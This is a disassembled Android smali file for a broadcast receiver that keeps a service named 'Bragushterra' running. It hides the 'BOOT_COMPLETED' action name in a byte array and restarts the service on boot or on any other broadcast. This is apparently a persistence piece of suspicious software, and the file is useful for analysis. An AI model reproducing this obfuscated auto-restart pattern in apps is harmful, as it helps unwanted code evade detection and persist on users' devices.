.class public Lcom/bratolubzet/stlstart/Bratisko;
.super Landroid/content/BroadcastReceiver;
.source "Bratisko.java"


# static fields
.field private static final SERVICE_CLASS:Ljava/lang/String; = "com.bratolubzet.stlstart.Bragushterra"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 9
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private isMyServiceRunning(Landroid/content/Context;Ljava/lang/String;)Z
    .locals 4
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "fullName"    # Ljava/lang/String;

    .prologue
    .line 31
    const-string v2, "activity"

    invoke-virtual {p1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    .line 33
    .local v0, "manager":Landroid/app/ActivityManager;
    const v2, 0x7fffffff

    invoke-virtual {v0, v2}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;

    move-result-object v2

    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    .line 32
    :cond_0
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-nez v3, :cond_1

    .line 38
    const/4 v2, 0x0

    :goto_0
    return v2

    .line 33
    :cond_1
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager$RunningServiceInfo;

    .line 34
    .local v1, "service":Landroid/app/ActivityManager$RunningServiceInfo;
    iget-object v3, v1, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    invoke-virtual {v3}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 35
    const/4 v2, 0x1

    goto :goto_0
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 5
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 15
    const/16 v3, 0xe

    new-array v1, v3, [B

    fill-array-data v1, :array_0

    .line 16
    .local v1, "retrovytes":[B
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "Android.intent.action."

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-instance v4, Ljava/lang/String;

    invoke-direct {v4, v1}, Ljava/lang/String;-><init>([B)V

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 17
    .local v0, "retro":Ljava/lang/String;
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    .line 18
    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    .line 19
    .local v2, "serviceIntent":Landroid/content/Intent;
    const-string v3, "com.bratolubzet.stlstart.Bragushterra"

    invoke-virtual {v2, v3}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 20
    invoke-virtual {p1, v2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 28
    .end local v2    # "serviceIntent":Landroid/content/Intent;
    :cond_0
    :goto_0
    return-void

    .line 22
    :cond_1
    const-string v3, "com.bratolubzet.stlstart.Bragushterra"

    invoke-direct {p0, p1, v3}, Lcom/bratolubzet/stlstart/Bratisko;->isMyServiceRunning(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_0

    .line 23
    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    .line 24
    .restart local v2    # "serviceIntent":Landroid/content/Intent;
    const-string v3, "com.bratolubzet.stlstart.Bragushterra"

    invoke-virtual {v2, v3}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 25
    invoke-virtual {p1, v2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    .line 15
    nop

    :array_0
    .array-data 1
        0x42t
        0x4ft
        0x4ft
        0x54t
        0x5ft
        0x43t
        0x4ft
        0x4dt
        0x50t
        0x4ct
        0x45t
        0x54t
        0x45t
        0x44t
    .end array-data
.end method
